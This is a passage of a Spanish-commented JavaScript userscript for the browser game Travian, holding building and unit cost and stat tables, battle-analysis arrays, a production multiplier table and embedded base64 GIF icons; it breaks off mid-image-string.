	buildingCost[37] = casaHeroeCost;
	buildingCost[38] = greatWarehouseCost;
	buildingCost[39] = greatGranaryCost;
	buildingCost[40] = maravillaCost;

	var gidToName = new Array();
    gidToName[1] = 'lenyador';
    gidToName[2] = 'barro';
    gidToName[3] = 'hierro';
	gidToName[4] = 'cereal';
    gidToName[5] = 'sawmill';
    gidToName[6] = 'brickyard';
    gidToName[7] = 'ironFoundry';
    gidToName[8] = 'flourMill';
    gidToName[9] = 'bakery';
    gidToName[10]= 'warehouse';
    gidToName[11]= 'granary';
    gidToName[12]= 'blacksmith';
    gidToName[13]= 'armoury';
    gidToName[14]= 'tournamentSquare';
    gidToName[15]= 'mainBuilding';
    gidToName[16]= 'rallyPoint';
    gidToName[17]= 'marketplace';
    gidToName[18]= 'embassy';
    gidToName[19]= 'barracks';
    gidToName[20]= 'stable';
    gidToName[21]= 'workshop';
    gidToName[22]= 'academy';
    gidToName[23]= 'cranny';
    gidToName[24]= 'ayuntamiento';
    gidToName[25]= 'residence';
    gidToName[26]= 'palace';
    gidToName[27]= 'tesoro';
    gidToName[28]= 'oficinaComercio';
    gidToName[29]= 'greatBarrack';
    gidToName[30]= 'greatStable';
    gidToName[31]= 'wallGauls';
    gidToName[32]= 'wallRomans';
    gidToName[33]= 'wallTeutons';
    gidToName[34]= 'cantero';
    gidToName[35]= 'cerveceria';
    gidToName[36]= 'trampa';
    gidToName[37]= 'casaHeroe';
    gidToName[38]= 'greatWarehouse';
    gidToName[39]= 'greatGranary';
    gidToName[40]= 'maravilla';

	// Costes de produccion de cada unidad y su carga
	var uc = new Array();

	// couleur batiment constructible
	var CN_COLOR_NEUTRAL = '#FDF8C1';
	var CN_COLOR_TEXT = '#000000';
	var CN_COLOR_MAX_LEVEL = '#0e0';
	var CN_COLOR_NO_UPGRADE = '#FF6347';
	var CN_COLOR_UPGRADABLE_VIA_NPC = '#FFA07A';

	// Romanos
	uc[1] = [120,100,180,40,40]; 		// Legionario
	uc[2] = [100,130,160,70,20]; 		// Pretoriano
	uc[3] = [150,160,210,80,50]; 		// Imperano
	uc[4] = [140,160,20,40,0]; 		// Legati
	uc[5] = [550,440,320,100,100];	 	// Imperatoris
	uc[6] = [550,640,800,180,70]; 		// Caesaris
	uc[7] = [900,360,500,70,0]; 		// Carnero
	uc[8] = [950,1350,600,90,0]; 		// Catapulta
	uc[9] = [30750,27200,4500,37500,0]; 	// Senador
	uc[10] = [5800,5300,7200,5500,3000]; 	// Descubridor

	// Germanos
	uc[11] = [95,75,40,40,60]; 		// Lanzador porras
	uc[12] = [145,70,85,40,40]; 		// Luchador lanza
	uc[13] = [130,120,170,70,50]; 		// Luchador hacha
	uc[14] = [160,100,50,50,0]; 		// Emisario
	uc[15] = [370,270,290,75,110]; 		// Paladin
	uc[16] = [450,515,480,80,80]; 		// Caballista teutona
	uc[17] = [1000,300,350,70,0]; 		// Ariete
	uc[18] = [900,1200,600,60,0]; 		// Catapulta
	uc[19] = [35500,26600,25000,27200,0]; 	// Cabecilla
	uc[20] = [7200,5500,5800,6500,3000]; 	// Descubridor

	// Galos
	uc[21] = [100,130,55,30,30]; 		// Falange
	uc[22] = [140,150,185,60,45]; 		// Luchador espada
	uc[23] = [170,150,20,40,0]; 		// Batidor
	uc[24] = [350,450,230,60,75]; 		// Rayo
	uc[25] = [360,330,280,120,35]; 		// Druida
	uc[26] = [500,620,675,170,65]; 		// Haeduanos
	uc[27] = [950,555,330,75,0]; 		// Carnero
	uc[28] = [960,1450,630,90,0]; 		// Catapulta
	uc[29] = [30750,45400,31000,37500,0]; 	// Cacique
	uc[30] = [5500,7000,5300,4900,3000]; 	// Descubridor

	// Fauna
	uc[31] = [0, 0, 0, 0, 0];		// Rata
	uc[32] = [0, 0, 0, 0, 0];		// Ara�a
	uc[33] = [0, 0, 0, 0, 0];		// Serpiente
	uc[34] = [0, 0, 0, 0, 0];		// Murcielago
	uc[35] = [0, 0, 0, 0, 0];		// Jabali
	uc[36] = [0, 0, 0, 0, 0];		// Lobo
	uc[37] = [0, 0, 0, 0, 0];		// Oso
	uc[38] = [0, 0, 0, 0, 0];		// Cocodrilo
	uc[39] = [0, 0, 0, 0, 0];		// Tigre
	uc[40] = [0, 0, 0, 0, 0];		// Elefante

// Natares
	uc[41] = [0, 0, 0, 0, 0];		// Pikeman
	uc[42] = [0, 0, 0, 0, 0];		// Thorned warrior
	uc[43] = [0, 0, 0, 0, 0];		// Guardsman
	uc[44] = [0, 0, 0, 0, 0];		// Birds of prey
	uc[45] = [0, 0, 0, 0, 0];		// Axerider
	uc[46] = [0, 0, 0, 0, 0];		// Natarian knight
	uc[47] = [0, 0, 0, 0, 0];		// Warelephant
	uc[48] = [0, 0, 0, 0, 0];		// Ballista
	uc[49] = [0, 0, 0, 0, 0];		// Natarian emperor
	uc[50] = [0, 0, 0, 0, 0];		// Settler

	// Otra nueva raza! (demonios? ojos rojos?)
	uc[51] = [0, 0, 0, 0, 0];
	uc[52] = [0, 0, 0, 0, 0];
	uc[53] = [0, 0, 0, 0, 0];
	uc[54] = [0, 0, 0, 0, 0];
	uc[55] = [0, 0, 0, 0, 0];
	uc[56] = [0, 0, 0, 0, 0];
	uc[57] = [0, 0, 0, 0, 0];
	uc[58] = [0, 0, 0, 0, 0];
	uc[59] = [0, 0, 0, 0, 0];
	uc[60] = [0, 0, 0, 0, 0];

	uc[98] = [0, 0, 0, 0, 0];		// Trampa?
	uc[99] = [0, 0, 0, 0, 0];		// Trampa?

	// MDL - more detailed unit data (in string form, so kind of a pain to use with the other stuff)
	var unitNameIndex = 0;
	var unitAttackIndex = 2;
	var unitInfDefenseIndex = 3;
	var unitCavDefenseIndex = 4;
	var unitWoodCostIndex = 5;
	var unitClayCostIndex = 6;
	var unitIronCostIndex = 7;
	var unitCropCostIndex = 8;
	var unitCropConsumptionIndex = 9;
	var unitSpeedIndex = 10;
	var unitBuildingIndex = 11;
	var unitData = [
	[null, null, null, null, null, null, null, null, null, null, null, null], // dummy line to get indexes to line up (there is no unit 0)
		[T('R1'),T('R1'),"40","35","50","120","100","180","40","1","6", 'build.php?gid=19'],
		[T('R2'),T('R2'),"30","65","35","100","130","160","70","1","5",'build.php?gid=19'],
		[T('R3'),T('R3'),"70","40","25","150","160","210","80","1","7", 'build.php?gid=19'],
		[T('R4'),T('R4'),"0","20","10","140","160","20","40","2","16",'build.php?gid=20'],
		[T('R5'),T('R5'),"120","65","50","550","440","320","100","3","14",'build.php?gid=20'],
		[T('R6'),T('R6'),"180","80","105","550","640","800","180","4","10",'build.php?gid=20'],
		[T('R7'),T('R7'),"60","30","75","900","360","500","70","3","4",'build.php?gid=21'],
		[T('R8'),T('R8'),"75","60","10","950","1350","600","90","6","3",'build.php?gid=21'],
		[T('R9'),T('R9'),"50","40","30","30750","27200","45000","37500","4","4",'build.php?gid=21'],
		[T('R10'),T('R10'),"0","80","80","5800","5300","7200","5500","1","5",],
		[T('T1'),T('T1'),"40","20","5","95","75","40","40","1","7",'build.php?gid=19'],
		[T('T2'),T('T2'),"10","35","60","145","70","85","40","1","7",'build.php?gid=19'],
		[T('T3'),T('T3'),"60","30","30","130","120","170","70","1","6",'build.php?gid=19'],
		[T('T4'),T('T4'),"0","10","5","160","100","50","50","1","9",'build.php?gid=19'],
		[T('T5'),T('T5'),"55","100","40","370","270","290","75","2","10",'build.php?gid=20'],
		[T('T6'),T('T6'),"150","50","75","450","515","480","80","3","9",'build.php?gid=20'],
		[T('T7'),T('T7'),"65","30","80","1000","300","350","70","3","4",'build.php?gid=21'],
		[T('T8'),T('T8'),"50","60","10","900","1200","600","60","6","3",'build.php?gid=21'],
		[T('T9'),T('T9'),"40","60","40","35500","26600","25000","27200","4","4",],
		[T('T10'),T('T10'),"10","80","80","7200","5500","5800","6500","1","5",],
		[T('G1'),T('G1'),"15","40","50","100","130","55","30","1","7",'build.php?gid=19'],
		[T('G2'),T('G2'),"65","35","20","140","150","185","60","1","6",'build.php?gid=19'],
		[T('G3'),T('G3'),"0","20","10","170","150","20","40","2","17",'build.php?gid=20'],
		[T('G4'),T('G4'),"90","25","40","350","450","230","60","2","19",'build.php?gid=20'],
		[T('G5'),T('G5'),"45","115","55","360","330","280","120","2","16",'build.php?gid=20'],
		[T('G6'),T('G6'),"140","50","165","500","620","675","170","3","13",'build.php?gid=20'],
		[T('G7'),T('G7'),"50","30","105","950","555","330","75","3","4",'build.php?gid=21'],
		[T('G8'),T('G8'),"70","45","10","960","1450","630","90","6","3",'build.php?gid=21'],
		[T('G9'),T('G9'),"40","50","50","30750","45400","31000","37500","4","5",],
		[T('G10'),T('G10'),"0","80","80","5500","7000","5300","4900","1","5",],
		[T('N1'),T('N1'),"10","25","10","/","/","/","/","1","20",],
		[T('N2'),T('N2'),"20","35","40","/","/","/","/","1","20",],
		[T('N3'),T('N3'),"60","40","60","/","/","/","/","1","20",],
		[T('N4'),T('N4'),"80","66","50","/","/","/","/","1","20",],
		[T('N5'),T('N5'),"50","70","33","/","/","/","/","2","20",],
		[T('N6'),T('N6'),"100","80","70","/","/","/","/","2","20",],
		[T('N7'),T('N7'),"250","140","200","/","/","/","/","3","20",],
		[T('N8'),T('N8'),"450","380","240","/","/","/","/","3","20",],
		[T('N9'),T('N9'),"200","170","250","/","/","/","/","3","20",],
		[T('N10'),T('N10'),"600","440","520","/","/","/","/","5","20",],
	];

	// Travian: Battle Analyse
	//0-attack 1-lostunits 2-load 3-maxload 4-food 5-statushero 6-lostfood 7-trap 8-i 9-c
	var ats = new Array(0,0,0,0,0,0,0,0,0,0);
	//0-def1 1-def2 2-lostunits 3-food 4-statushero 5-lostfood
	var dts = new Array(0,0,0,0,0,0);
	//0-att 1-def1 2-def2 3-lumber 4-clay 5-iron 6-crop 7-food 8-speed 9-load
	romans = new Array();
	romans[0] = new Array(40,35,50,120,100,180,40,1,6,40);					// Legionnaire
	romans[1] = new Array(30,65,35,100,130,160,70,1,5,20);					// Praetorian
	romans[2] = new Array(70,40,25,150,160,210,80,1,7,50);					// Imperian
	romans[3] = new Array(0,20,10,140,160,20,40,2,16,0);					// Equites Legati
	romans[4] = new Array(120,65,50,550,440,320,100,3,14,100);				// Equites Imperatoris
	romans[5] = new Array(180,80,105,550,640,800,180,4,10,70);				// Equites Caesaris
	romans[6] = new Array(60,30,75,900,360,500,70,3,4,0);					// Battering Ram
	romans[7] = new Array(75,60,10,950,1350,600,90,6,3,0);					// Fire catapult
	romans[8] = new Array(50,40,30,30750,27200,45000,37500,4,4,0);			// Senator
	romans[9] = new Array(0,80,80,5800,5300,7200,5500,1,5,1600);			// Settler
	romans[10] = new Array(0,0,0,0,0,0,0,6,0,0);							// Hero
	romans[11] = new Array(1,1,1,0,0,0,1,1,1,1,0)
	romans[12] = new Array(0,0,0,1,1,1,0,0,0,0,0)
	teutons = new Array();
	teutons[0] = new Array(40,20,5,95,75,40,40,1,7,60);						// Clubswinger
	teutons[1] = new Array(10,35,60,145,70,85,40,1,7,40);					// Spearfighter
	teutons[2] = new Array(60,30,30,130,120,170,70,1,6,50);					// Axefighter
	teutons[3] = new Array(0,10,5,160,100,50,50,1,9,0);						// Scout
	teutons[4] = new Array(55,100,40,370,270,290,75,2,10,110);				// Paladin
	teutons[5] = new Array(150,50,75,450,515,480,80,3,9,80);				// Teuton Knight
	teutons[6] = new Array(65,30,80,1000,300,350,70,3,4,0);					// Ram
	teutons[7] = new Array(50,60,10,900,1200,600,60,6,3,0);					// Catapult
	teutons[8] = new Array(40,60,40,35500,26600,25000,27200,4,4,0);			// Chief
	teutons[9] = new Array(10,80,80,7200,5500,5800,6500,1,5,1600);			// Settler
	teutons[10] = new Array(0,0,0,0,0,0,0,6,0,0);							// Hero
	teutons[11] = new Array(1,1,1,0,0,0,1,1,1,1,0)
	teutons[12] = new Array(0,0,0,1,1,1,0,0,0,0,0)
	gauls = new Array(10);
	gauls[0] = new Array(15,40,50,100,130,55,30,1,7,30);					// Phalanx
	gauls[1] = new Array(65,35,20,140,150,185,60,1,6,45);					// Swordfighter
	gauls[2] = new Array(0,20,10,170,150,20,40,2,17,0);						// Pathfinder
	gauls[3] = new Array(90,25,40,350,450,230,60,2,19,75);					// Theutates Thunder
	gauls[4] = new Array(45,115,55,360,330,280,120,2,16,35);				// Druidrider
	gauls[5] = new Array(140,50,165,500,620,675,170,3,13,65);				// Haeduan
	gauls[6] = new Array(50,30,105,950,555,330,75,3,4,0);					// Ram
	gauls[7] = new Array(70,45,10,960,1450,630,90,6,3,0);					// Trebuchet
	gauls[8] = new Array(40,50,50,30750,45400,31000,37500,4,5,0);			// Chieftain
	gauls[9] = new Array(0,80,80,5500,7000,5300,4900,1,5,1600);				// Settler
	gauls[10] = new Array(0,0,0,0,0,0,0,6,0,0);								// Hero
	gauls[11] = new Array(1,1,1,0,0,0,1,1,1,1,0)
	gauls[12] = new Array(0,0,1,1,1,1,0,0,0,0,0)
	nature = new Array(10)
	nature[0] = new Array(10,25,10,0,0,0,0,1,20,0);							// Rat
	nature[1] = new Array(20,35,40,0,0,0,0,1,20,0);							// Spider
	nature[2] = new Array(60,40,60,0,0,0,0,1,20,0);							// Serpent
	nature[3] = new Array(80,66,50,0,0,0,0,1,20,0);							// Bat
	nature[4] = new Array(50,70,33,0,0,0,0,2,20,0);							// Wild boar
	nature[5] = new Array(100,80,70,0,0,0,0,2,20,0);						// Wolf
	nature[6] = new Array(250,140,200,0,0,0,0,3,20,0);						// Bear
	nature[7] = new Array(450,380,240,0,0,0,0,3,20,0);						// Crocodile
	nature[8] = new Array(200,170,250,0,0,0,0,3,20,0);						// Tiger
	nature[9] = new Array(600,440,520,0,0,0,0,5,20,0);						// Elephant
	// Travian: Battle Analyse

	var pdt = new Array();

	pdt[0]=[1];
	pdt[1]=[1.1];
	pdt[2]=[1.2];
	pdt[3]=[1.3];
	pdt[4]=[1.4];
	pdt[5]=[1.5];
	pdt[6]=[1.6];
	pdt[7]=[1.7];
	pdt[8]=[1.8];
	pdt[9]=[1.9];
	pdt[10]=[2];
	pdt[11]=[2.1];
	pdt[12]=[2.2];
	pdt[13]=[2.3];
	pdt[14]=[2.4];
	pdt[15]=[2.5];
	pdt[16]=[2.6];
	pdt[17]=[2.7];
	pdt[18]=[2.8];
	pdt[19]=[2.9];
	pdt[20]=[3];

	//var lvlpdt = 0;	// make it global here. ;)
	var nbunit = readCookie("nbunit1" + server);
	if (nbunit == null)
		nbunit = '';
	else
		nbunit = unescape(nbunit);

	var actual = new Array(4);		// Informacion de recursos almacenados
	var total = new Array(4);		// Capacidad de los almacenes y granero
	var produccion = new Array(4);	// Produccion por segundo
	var imagenes = new Array();		// Imagenes pre-cargadas

	// Se estima cada linea como una altura de 20 pixeles  // Il est estimé que chaque ligne une hauteur de 20 pixels
	var pixelsPorLinea = 20;

	// images du script
	function loadImage(){
	// Imagen de un sobre para enviar IGM
	imagenes["igm"] = 'data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAAICAYAAAAvOAWIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1QsKFws6qttDxQAAAB10RVh0Q29tbWVudABDcmVhdGVkIHdpdGggVGhlIEdJTVDvZCVuAAAAkUlEQVQY05XQTUpDQRAE4K8yz9BuPEduEH8C2Tw8haeT3CQbPZEiIeNmhLdIAvamqerqaqqDdxxwcr0mvAWv+MYHfi4I13hErXCuqmOSp9batFS11qYk26o64gzzmCXJPsl64DvskYHn1cKo995PvfdnPOBl5OjLa/PY3qEGtxm9Bh/MfwG/8Hkj4Bb3+c/rfgHKwRzhskmMfQAAAABJRU5ErkJggg==';
	// Imagen compuesta para el mercado con 3 secciones: enviar recursos, compra y venta
	imagenes["mercado"] = 'data:image/gif;base64,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';
	// Imagen compuesta para militar con 4 secciones: plaza de reuniones, cuartel, establo / corral y taller
	imagenes["militar"] = 'data:image/gif;base64,R0lGODlhRgBkAOf/AAABABEQCBsbDiIZCBobFiEfDRgnLiYnGCUnJDAmDTAmFT8kCy4sFjcxISM3PSw3NDM3KDQ4ITg4HEI1FT43Fkc0FBw/VkE4HjFAICpDPFg4FUBDJVI+FkhCIEVBMFk+Dj5HLlJAH01EGUREPSZMZEZGMUBLJ1lEHF9IIWxEHFRPKi5cUVFPQmRNH15RHDtXYEpZL1JXJ1NTPmhQFXFNDWtNHm1OFXNNF1lYK2BVKVJVUmtZCnRTFHxVGFxhMGZeKJpJF1tjO4BYE4JZCzRokVVoOnRcL2piNGlnHWVjQGJiVGJkTIxcCIFiEYBfKIViIGlvKnVpNINuCWlzOFxzYnpwJGJudH9yEGV0T2N4QpFqFG1xWJtoDW90RoxqMYFtQnhwTDmHg5drIG5ycpNtKqJtBpx0FqlwDG+CWJV+CZt1L3aAXKF0MJGAHJd3PXaAZ4F9W3GJUpKALONeEah5J41/UXSNTIOHRad5LnyBgJd/QoGCb5yIDaCGDrh6DpqEPH2OV2qPh5SGSIOQS61/NKeMBoSVQ4COdamEQ5GJa4aRZ3yaVpyVPaqNR5OQeJ6SVZWTcLWMR5GTiryMPZCVl6qdJky1p5+Wa8iOKbyeA42pYoqtYJiif5CpdsKYTrGeY5ygmtSYMpuli6Gijaigia6ieJS1XaqkgJOnscusBLCmdICztsygUaGmqOGfLJW6a8KoVMOtQqG4eJnBadW1Csm0P9m4AN2oUaa6i7e0gNmrVruzjbS0nqTBha24nqy2rbKzsOHAA6LOb4zLz+O0Xr26q7e8v+zGA8W8o63OiOnJB7LDy7bLnsm+svG5YLTPk77Ftq7aecPFwvHAY83HosXKrcjGvNLIm+fPR7Xgd9TOk8rMybTmfL3dl73hjtXNxrbX58/UvdvTpcncscDojM7ZudjWsfPbTdDWydTW08jsm+Pbrdze29Duqeritu7msdnxuurmyeHp2uXn5Ono3+Lu0uLxyvDy6PDy7vf1y/n00fb02/n25/b49P7//P///yH5BAEKAP8ALAAAAABGAGQAAAj+AP8JHEiwoMGDCBMqXMiwocOHECNKnEixosWLGDNq3Mixo8ePIEOKHEmypMmTKFOqXMmypcuXMGPKnEmzps2GrYxtYzevZ89024xRqtmqmwQGCSLMyuavKYCmUP3hM/aSUrp+/tT5+MOAgQQY9vr1AyC2LNamU4eipMSuKdZ+3F6ZaPTHTj2xZM2W9Xd2m9qRbJvmixYWnz9yiLlFyxbt3lPDhvWKbSptZLG3905hiCbVLLcDFLI4lioV8mR8e/u1+khJ3p4S+bBCKDFrcll7JnYcqffY3zzS+FC/3buNo448/vbtgRAPHz8QGTaRphdNnb0iM0Rwe/q7affuhov+lZs8b4zG3+byjWJAqp++F2E6/Ya7Z1O9TQwoRHvqvb9v4eUMg4ZtlV1kGDUlsNfIKf3kE8ADwnQWzTeAbBPNBgcIA4AxHHKYjm9QGYZEEsKVVSBF8+mzxxKQPEANPvoEoIQw3pCzzSyCLBJOOd10swcA6aTDDjvGfGMMOMbMI9YefRQyH198GcPORG1hZY4CCySyRDz85MMCNdEIAEFcsMDQTTjjMAPKhsakI+WbRPK1ygp93BEcaVIZw4w1EFVpmDlApMBLNfpsIEM+wMyiBAHRCEPAAc9Ek0UXXQBAUJHpGAkUOk2k0Ucf8+01jzGBaOJQW2j5E48HS/Dj3ij+B8QDzSsWOMANNwEc0M4sLjSx30C40NFMm5pOEQsffPTxSImTpSPNPA0NWRpf+ywBh6u7rCAAMuPYQQQJ2XBjwivc2NGECLNYygsTZ3BxhkBAbVNFLG30gWw46JDWzyhprHGiQts0RQ8/rrrDQjj34OOIJQ90A40wAQRwazT/kCNCExNkAcAI7rJ7xg4CbSMKNi7UmwYfV1ARRD/sSJFsG8A01J0MHrjTD8GubkONARl4848pBYAAz0DCFCABCKNY6q677d7xTzIuyBEANmm0wcciccwSxaf2piHUXwdJwxc/JcigD1aobbNNPgX0/E8cRUTTDjxDc5NFFnb8Y+n+JEyfwUQFHMCBTSDDYCNHH2lQMwWy9trLxyA5KTSfOAEYoA+UOm3DywZ2CaRONDDAIIw6dpiwyDh6/4OJGFwwoUECZEwjxzm77BLLOWnU8UgVnxbS+MnSgJKQ2Fgl4gAJ+aCGj5vfUCMMOQK1I0yvM6DxSgc7bCCQpaFgcoMNAWjQAzGnUOPOOtSccskftciBbLLInqwJ2AX9Flw4BBBweT/b6L